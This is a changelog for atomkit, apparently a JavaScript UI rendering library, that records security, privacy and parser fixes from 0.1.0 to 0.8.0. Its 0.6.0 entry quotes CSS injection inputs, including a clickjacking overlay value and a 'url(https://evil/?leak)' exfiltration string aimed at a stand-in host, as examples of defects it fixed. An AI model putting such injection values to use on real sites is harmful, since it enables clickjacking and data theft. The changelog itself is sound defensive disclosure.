# Changelog

All notable changes to `@noidmejs/atomkit`. Pre-1.0: minor versions may break.

## 0.8.0

A security fix, and the first primitive the visual composer needs.

### Security — BREAKING for anyone relying on the old (leaky) behaviour
- **`maskNode` spread unknown node-level fields straight through.** It was
  deny-by-default over `props` and allow-by-default over everything else, because it
  built its result with `{ ...node, props }`. `parseDocument`'s strict schema does not
  guard this path — neither `Render()` nor `stripDocument()` validates — so a
  hand-authored, editor-built or LLM-generated node carried the field to the client:

  ```
  { props:{text:"ada@corp.com"}, secret:"SSN-123-45-6789", meta:{security:{pii:true}} }
  → stripDocument(doc, {canViewPii:false})
  → {"props":{"text":"•••••"},"secret":"SSN-123-45-6789"}     ← leaked
  ```

  The masked node is now **rebuilt from an explicit field list**. A field this function
  has not been taught about fails CLOSED. Found by an adversarial review, in code
  shipped as 0.7.0.

### Fixed — BREAKING
- **An unquoted `{` in an attribute value silently corrupted the document.** `{` opens a
  block, so `box document={{x}}` parsed to `props.document = ""`, and
  `box a=1 document={{x}} b=2` **split into two nodes**, inventing an atom named `b=2`
  that then failed closed and rendered nothing. Neither form raised an error. A `{`
  directly after `=` is now a parse error naming the attribute. Blocks are untouched;
  a quoted `"{{ … }}"` still passes through intact.

### Added
- **`instrumentRegistry(registry)`** and **`NODE_ID_ATTR`** — returns a registry whose
  atoms tag their root element with `data-ak-id`, so an editor can hit-test, select and
  measure a rendered document. `Render` emits no per-node handle of its own (it sets
  `class="ak-<id>"` only for nodes declaring responsive overrides), and the obvious
  alternative — a wrapper `<div>` per atom — destroys every flex and grid layout,
  because the wrapper becomes the flex item instead of the atom. This injects the
  attribute onto the element the atom already returns, via `cloneElement`: markup is
  byte-identical apart from the attribute, and atoms that render nothing still render
  nothing. The suite carries a negative control that re-implements it the wrong way and
  proves the checks catch it.

### Not shipped, deliberately
- A safe expression evaluator (no `eval`, eight mutation-tested guards, 4000-case fuzz)
  exists in `src/expr.ts` but is **not exported**. It has zero call sites, and its
  contract is unsettled: the AQL 1.0 spec wants a root allowlist inside `parseExpr`,
  while the governance gate records that there deliberately is none. Publishing would
  freeze both as a semver commitment before either question is answered. Its exported
  `FUNCTIONS` whitelist was also mutable — anything in the process could widen it and a
  document could then call the injected function. It is now frozen and null-prototyped.
  It ships when it has a consumer and a settled surface.

## 0.7.0

Toolchain and validation hardening. Every change below was verified by executing
the built output; the schema changes are covered by the new `test/schema.test.mjs`.

### BREAKING
- **Node >= 22.** `engines` was `">=18"`, but Node 18 reached end-of-life on
  2025-04-30 and Node 20 on 2026-04-30 (per `nodejs/Release/schedule.json`). The
  package also relies on global `fetch`, stable only from Node 21. Installing on
  Node 18/20/21 now fails with `EBADENGINE` under `--engine-strict`. CI tests on
  22 (maintenance LTS), 24 (active LTS) and 26 (current).
- **`zod` 3 → 4.** `zod` is a *runtime* dependency and this package re-exports
  zod-typed values (`documentSchema`, `nodeSchema`) from its public `.d.ts`. Those
  exported types now reference zod-4-only internals, so a consumer pinned to zod 3
  who references them will hit type errors. Consumers who only call
  `parseDocument()` are unaffected. Runtime validation behaviour is unchanged —
  verified: identical `unrecognized_keys` rejection on both majors.
- **Every object in the document is now strict.** Previously only the *node* level
  rejected unknown keys, so `a11y: { onclick: … }`, `meta: { evil: … }`,
  `meta.security: { bypass: true }` and `data.source: { evil: 1 }` all validated
  cleanly. Nothing read them, so it was never exploitable — but a schema that
  shrugs at input it does not understand is not a trust boundary. A document
  carrying extra keys anywhere will now be rejected by `parseDocument()`.
- **Duplicate node ids are rejected.** Nothing checked. Two nodes sharing an id
  share the generated responsive rule `.ak-<id>` — one silently restyles the other,
  last rule winning — and they collide as React keys. `parseDocument()` now throws;
  `lint()` reports a `unique-id` warning (because `Render()` never validates).

### Fixed
- `z.record(value)` → `z.record(z.string(), value)` in four places in `schema.ts`.
  zod 4 removed the single-argument form. The two-argument form is accepted by zod
  3 as well, so this edit is version-agnostic.
- `.strict()` → `z.strictObject()` throughout; `.strict()` is deprecated in zod 4.

### Changed
- `typescript` devDependency → `^7.0.0`. Emitted `.js` and `.d.ts` are byte-identical
  to the 5.9.3 output (only sourcemap `mappings` differ).
- `prepublishOnly` now runs `npm run build && npm test`, not just the build. A
  broken test suite could previously be published.

### Added
- **`test/schema.test.mjs`** — the suite never once exercised `parseDocument`,
  `documentSchema` or `nodeSchema`. The strict rejection that governance leans on
  was entirely untested, and would have stayed green through a zod major bump.

## 0.6.0

A multi-lens audit found that three of this package's headline guarantees did not
hold. Each item below was reproduced by executing the shipped `dist/`, and each is
now covered by `test/regressions.test.mjs`.

### Security / privacy — BREAKING
- **PII masking is now genuinely by value.** `maskNode` masked only *string*-typed
  props whose *name* appeared in a fixed list, so numeric PII (`value: 250000`), a
  phone under any other prop name, the `video` atom's `url`, and every prop of a
  custom atom passed through `stripDocument` unmasked. Masking is now
  deny-by-default: every prop is masked or dropped unless it is provably structural
  (`width`, `level`, `cols`, …); locators (`src`, `href`, `url`, `poster`, …) are
  dropped; numbers, booleans and unknown props fail closed.
- **The renderer handed atoms the unmasked node.** `AtomRenderProps.node` was the
  original node, so any atom reading `node.props.*` / `node.a11y.*` read around the
  mask — the built-in `Image` did. Atoms now receive the masked node.
- **`stripDocument` leaked egress-only fields.** `meta.note` (documented "never
  rendered") and credential-bearing data-binding headers (`Authorization`,
  `Cookie`, `x-api-key`, …) were serialised to every client. Both are now stripped.
- **Analytics attributes now fail CLOSED.** They were emitted unless consent was
  explicitly `false`, so a host passing no context (the README quick-start) shipped
  `data-analytics-*` with no consent signal. They now require
  `consent.analytics === true`, matching `consentCategory` gating and
  data-protection-by-default. **Set `consent: { analytics: true }` to restore tracking.**
- **Dimension props bypassed the style sanitiser.** `container width="100px;position:fixed;top:0"`
  injected a clickjacking overlay and `gutter="url(https://evil/?leak)"` exfiltrated
  via CSS — the exact vectors SECURITY.md claims are dropped. `Section`, `Container`,
  `Grid` and `Spacer` now route `width`/`gutter`/`min`/`height` through the new
  exported `safeDim()`, which `atomkit-compiler` imports rather than duplicating.
- **A11y text is masked with `PII_MASK_LABEL` ("Redacted")** instead of `•••••`,
  which a screen reader announces as "bullet bullet bullet" or skips entirely.

### Fixed — BREAKING
- **Responsive overrides never applied.** The base style is an inline `style=`
  attribute and the override a class rule inside `@media`; an inline style outranks
  any class selector at every viewport, so `md:size=4rem` was dead over a base
  `size=12px`. Media declarations are now `!important`, scoped to the node's own
  `.ak-<id>` class. (The old tests asserted the CSS *string* was produced, never
  that it won.)
- **`serialize()` silently dropped governance.** It emitted only props/style/
  aria-label/role/track/protected/pii — so `roles`, `consentCategory`, `hidden`,
  data bindings, `alt`, `tags` and analytics `event`/`category` vanished, and a
  doc→AQL→doc round trip turned an admin-only node into a public one. `serialize()`
  is now the exact inverse of `parse()` (property-tested), emits `desc` on the page
  header, and **throws** on any field AQL cannot express rather than dropping it.
- **`coerce()` destroyed leading/trailing zeros with no escape hatch.**
  `zip="02115"` became `2115` and `ver="1.10"` became `1.1`, because quoting was
  stripped before coercion. A **quoted** value is now always a string; bare values
  still coerce. `serialize()` re-quotes strings that would otherwise re-coerce.
- **`grid cols` is clamped to 24**, matching the compiler (an unclamped `cols=100000`
  emitted a 100k-track template).

### Added
- `safeDim(value, fallback)` — the sanitiser for props that reach an inline style.
- `PII_MASK_LABEL` — the assistive-technology mask.
- `test/regressions.test.mjs` — one assertion per defect above.

## 0.5.1
### Fixed
- **AQL parser**: an unquoted URL value (`href=https://…`) was truncated at `//`
  and the rest of the line swallowed as a comment. `//` now starts a trailing
  comment only at head start or after whitespace, so unquoted `https://` URLs (and
  the attributes after them) parse correctly. Quoted URLs were unaffected.

## 0.5.0
### Security / privacy (from the adversarial audit)
- **PII masking is now by VALUE**: masks the data-binding target prop, content
  props (`summary`/`label`/`value`/`title`/`caption`/`alt`), `a11y` label text and
  analytics prop values, and drops the data binding — not just `text`/`src`/`href`.
- **PII masking cascades to descendants**: flagging a container `pii` protects its
  whole subtree, in both `renderNode` and `stripDocument`.
- Registry lookup uses `Object.hasOwn` — a `node.type` naming an `Object.prototype`
  member (`constructor`, `toString`, …) now fails closed instead of throwing.
- `clean()` also rejects the URL-bearing CSS functions `image-set()` / `cross-fade()`.
### Accessibility
- `List` restores `role="list"` / `role="listitem"` when markers are removed (WCAG 1.3.1).
- New `lint(document)` — WCAG-oriented warnings (missing image `alt`, unnamed controls, heading level).

## 0.4.0
- Security hardening + **governance-at-egress** (`stripDocument`); deterministic
  selector-safe ids; `url()` + style guards; `getPath` prototype-pollution guard;
  parser caps (size / nodes / depth); consent-gated analytics.

## 0.3.0
- Richer atom set (`section`/`container`/`grid`/`row`/`stack`/`link`/`chip`/`list`/`icon`/`accordion`/`video`); char-level AQL parser (inline + multi-line blocks).

## 0.2.0
- **AQL** query language (`parse`/`compilePage`/`serialize`) + AI bridge (`systemPrompt`/`generate`); Node-portable ESM (NodeNext).

## 0.1.0
- Initial release: document model, SSR-safe renderer, starter atoms, `createBuilder`.
